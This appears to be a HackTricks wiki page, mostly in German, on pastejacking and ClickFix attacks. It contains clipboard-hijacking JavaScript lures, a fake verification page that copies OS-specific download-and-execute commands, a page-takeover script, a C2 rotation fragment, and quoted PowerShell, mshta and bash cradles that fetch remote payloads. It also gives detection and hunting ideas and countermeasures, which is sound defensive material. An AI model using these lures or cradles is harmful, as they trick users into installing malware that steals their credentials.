# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kopiere niemals etwas, das du nicht selbst kopiert hast." – alt, aber immer noch gültiger Rat

## Überblick

Clipboard hijacking – also known as *pastejacking* – missbraucht die Tatsache, dass Benutzer routinemäßig Befehle kopieren und einfügen, ohne sie zu überprüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) legt programmatisch vom Angreifer kontrollierten Text in die Systemzwischenablage. Opfer werden, normalerweise durch sorgfältig ausgearbeitete Social-Engineering-Anweisungen, dazu gebracht, **Win + R** (Ausführen-Dialog), **Win + X** (Quick Access / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage einzufügen (*paste*), wodurch sofort beliebige Befehle ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten E-Mail- und Web-Content-Sicherheitskontrollen, die Anhänge, Makros oder direkte Befehlsausführung überwachen. Der Angriff ist daher in Phishing-Kampagnen beliebt, die Commodity-Malware-Familien wie NetSupport RAT, Latrodectus loader oder Lumma Stealer ausliefern.

## Forced copy buttons and hidden payloads (macOS one-liners)

Einige macOS-Infostealer klonen Installer-Seiten (z. B. Homebrew) und **erzwingen die Verwendung eines “Copy”-Buttons**, sodass Benutzer nicht nur den sichtbaren Text markieren können. Der Eintrag in der Zwischenablage enthält den erwarteten Installer-Befehl plus eine angehängte Base64-Payload (z. B. `...; echo <b64> | base64 -d | sh`), sodass ein einziger *paste* beide ausführt, während die UI die zusätzliche Stufe verbirgt.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen nutzten `document.execCommand('copy')`, neuere verlassen sich auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Der ClickFix / ClearFake-Ablauf

1. Ein Nutzer besucht eine typosquatted oder kompromittierte Seite (z. B. `docusign.sa[.]com`)
2. Injectiertes **ClearFake** JavaScript ruft einen `unsecuredCopyToClipboard()` helper auf, der stillschweigend einen Base64-codierten PowerShell one-liner in die Zwischenablage speichert.
3. HTML-Anweisungen sagen dem Opfer: *“Drücke **Win + R**, füge den Befehl ein und drücke Enter, um das Problem zu beheben.”*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei sowie eine bösartige DLL enthält (klassisches DLL sideloading).
5. Der Loader entschlüsselt zusätzliche Stufen, injiziert Shellcode und installiert Persistenz (z. B. scheduled task) – und führt letztlich NetSupport RAT / Latrodectus / Lumma Stealer aus.

### Beispiel NetSupport RAT-Kette
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst APIs dynamisch mit **GetProcAddress** auf, lädt zwei Binärdateien (`data_3.bin`, `data_4.bin`) über **curl.exe** herunter, entschlüsselt sie mit dem rolling XOR key `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript-Downloader in **cscript.exe** aus
3. Ruft ein MSI payload ab → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer über MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verstecktes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mittels `extrac32` und Dateikonkatenation rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Anmeldeinformationen an `sumeriavgv.digital` exfiltriert.

## ClickFix: Zwischenablage → PowerShell → JS eval → Startup LNK mit rotierendem C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten ganz auf Dateidownloads und fordern Opfer auf, einen One‑Liner einzufügen, der JavaScript via WSH abruft und ausführt, Persistenz herstellt und den C2 täglich rotiert. Beobachtete Beispielkette:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Hauptmerkmale
- Verschleierte URL, die zur Laufzeit umgedreht wird, um eine oberflächliche Inspektion zu umgehen.
- JavaScript verankert sich über ein Startup LNK (WScript/CScript) und wählt den C2 anhand des aktuellen Tages – ermöglicht schnelle Domain-Rotation.

Minimales JS-Fragment, das verwendet wird, um C2s nach Datum zu rotieren:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die nächste Stufe setzt häufig einen Loader ein, der Persistenz etabliert und einen RAT (z. B. PureHVNC) nachlädt, oft TLS an ein hartcodiertes Zertifikat pinned und den Traffic chunked.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Aktuelle Kampagnen massenproduzieren gefälschte CDN/Browser-Verifizierungsseiten ("Just a moment…", IUAM-style), die Benutzer dazu zwingen, OS-spezifische Befehle aus ihrem clipboard in native Konsolen zu kopieren. Das verschiebt die Ausführung aus der Browser-Sandbox heraus und funktioniert sowohl unter Windows als auch macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Beispiel: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS: Persistenz des initialen Laufs
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und sichtbare Artefakte reduziert werden.

In-place page takeover auf kompromittierten Sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Erkennung & hunting-Ideen spezifisch für IUAM-style lures
- Web: Seiten, die Clipboard API an Verifizierungs-Widgets binden; Diskrepanz zwischen angezeigtem Text und Clipboard-Payload; `navigator.userAgent`-Branching; Tailwind + Single-Page-Replace in verdächtigen Kontexten.
- Windows-Endpunkt: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; batch/MSI-Installer, die aus `%TEMP%` ausgeführt werden.
- macOS-Endpunkt: Terminal/iTerm, das `bash`/`curl`/`base64 -d` mit `nohup` in zeitlicher Nähe zu Browser-Ereignissen startet; Hintergrundjobs, die das Schließen des Terminals überdauern.
- Korrelation von `RunMRU` Win+R-Historie und Clipboard-Schreibvorgängen mit nachfolgender Erstellung von Console-Prozessen.

Siehe auch für unterstützende Techniken

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix-Entwicklungen (ClearFake, Scarlet Goldfinch)

- ClearFake kompromittiert weiterhin WordPress-Sites und injiziert loader JavaScript, das externe Hosts (Cloudflare Workers, GitHub/jsDelivr) kettet und sogar blockchain “etherhiding” Aufrufe (z. B. POSTs an Binance Smart Chain API-Endpunkte wie `bsc-testnet.drpc[.]org`) verwendet, um die aktuelle lure logic zu laden. Jüngste Overlays nutzen stark fake CAPTCHAs, die Benutzer anweisen, einen One-Liner (T1204.004) zu copy/paste anstatt etwas herunterzuladen.
- Die initiale Ausführung wird zunehmend an signed script hosts/LOLBAS delegiert. Ketten vom Januar 2026 tauschten die frühere Verwendung von `mshta` gegen das eingebaute `SyncAppvPublishingServer.vbs`, das via `WScript.exe` ausgeführt wird und PowerShell-ähnliche Argumente mit Aliases/Wildcards übergibt, um Remote-Content zu holen:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` ist signiert und wird normalerweise von App-V verwendet; gepaart mit `WScript.exe` und ungewöhnlichen Argumenten (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) wird es zu einer high-signal LOLBAS stage für ClearFake.
- Im Februar 2026 verlagerten sich fake CAPTCHA payloads zurück zu reinen PowerShell download cradles. Zwei Live-Beispiele:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die erste Kette ist ein in-memory `iex(irm ...)` Grabber; die zweite stuft über `WinHttp.WinHttpRequest.5.1` auf, schreibt eine temporäre `.ps1` und startet sie mit `-ep bypass` in einem versteckten Fenster.

Erkennung/Hunting-Tipps für diese Varianten
- Prozessabfolge: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oder PowerShell cradles unmittelbar nach Zwischenablage-Schreibvorgängen/Win+R.
- Kommandozeilen-Schlüsselwörter: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, oder rohe IP-`iex(irm ...)`-Muster.
- Netzwerk: ausgehende Verbindungen zu CDN-Worker-Hosts oder Blockchain-RPC-Endpunkten von Skript-Hosts/PowerShell kurz nach dem Web-Browsing.
- Datei/Registry: temporäre `.ps1`-Erstellung unter `%TEMP%` plus RunMRU-Einträge, die diese One-Liner enthalten; blockieren/Alarm auslösen bei signed-script LOLBAS (WScript/cscript/mshta), die mit externen URLs oder obfuskierte Alias-Strings ausgeführt werden.

## Gegenmaßnahmen

1. Browser-Härtung – Schreibzugriff auf die Zwischenablage deaktivieren (`dom.events.asyncClipboard.clipboardItem` etc.) oder eine Benutzeraktion verlangen.
2. Sicherheitsbewusstsein – Benutzer schulen, sensible Befehle zu *tippen* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, um beliebige One-Liner zu blockieren.
4. Netzwerk-Kontrollen – ausgehende Anfragen zu bekannten pastejacking- und Malware-C2-Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** nutzt oft denselben ClickFix-Ansatz, nachdem Benutzer in einen bösartigen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
